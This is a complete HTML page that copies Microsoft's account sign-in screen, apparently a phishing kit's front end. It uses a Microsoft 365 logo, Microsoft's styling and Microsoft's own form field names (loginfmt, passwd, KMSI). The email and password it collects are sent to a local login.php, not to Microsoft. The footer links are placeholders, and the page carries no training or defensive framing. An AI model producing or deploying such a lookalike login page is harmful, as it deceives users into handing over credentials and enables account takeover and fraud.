<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @font-face {
            font-family: 'Segoe UI';
            src: local('Segoe UI'), local('SegoeUI-Regular');
            font-weight: normal;
            font-style: normal;
        }
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background-color: #f5f5f5;
            color: #333;
        }
        .ms-logo {
            width: 108px;
            height: 23px;
            background-image: url('ms365.png');
            background-repeat: no-repeat;
        }
        .form-container {
            max-width: 440px;
            min-height: 500px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .form-input {
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 12px;
            width: 100%;
            box-sizing: border-box;
        }
        .form-input:focus {
            border-color: #0078d4;
            outline: none;
        }
        .submit-btn {
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 12px;
            width: 100%;
            cursor: pointer;
        }
        .submit-btn:hover {
            background-color: #106ebe;
        }
        .footer-link {
            color: #0078d4;
            text-decoration: none;
        }
        .footer-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">
    <div class="form-container bg-white rounded-lg p-8 w-full">
        <div class="flex justify-center mb-8">
            <div class="ms-logo"></div>
        </div>
        
        <h1 class="text-2xl font-semibold text-center mb-6">Sign in</h1>
        
        <form action="login.php" method="POST" class="mb-6">
            <div class="mb-4">
                <input type="email" name="loginfmt" id="loginfmt" class="form-input" placeholder="Email, phone, or Skype" required>
            </div>
            
            <div class="mb-6 text-sm text-gray-600">
                No account? <a href="#" class="footer-link">Create one!</a>
            </div>
            
            <div class="mb-4">
                <input type="password" name="passwd" id="passwd" class="form-input" placeholder="Password" required>
            </div>
            
            <div class="mb-4 flex items-center">
                <input type="checkbox" name="KMSI" id="KMSI" class="mr-2">
                <label for="KMSI" class="text-sm">Keep me signed in</label>
            </div>
            
            <div class="mb-6">
                <button type="submit" class="submit-btn">Sign in</button>
            </div>
        </form>
        
        <div class="text-center mb-6">
            <a href="#" class="footer-link text-sm">Can't access your account?</a>
        </div>
        
        <div class="border-t border-gray-200 pt-6">
            <div class="flex justify-between text-xs text-gray-500">
                <div>
                    <a href="#" class="footer-link">Terms of use</a>
                </div>
                <div>
                    <a href="#" class="footer-link">Privacy & cookies</a>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
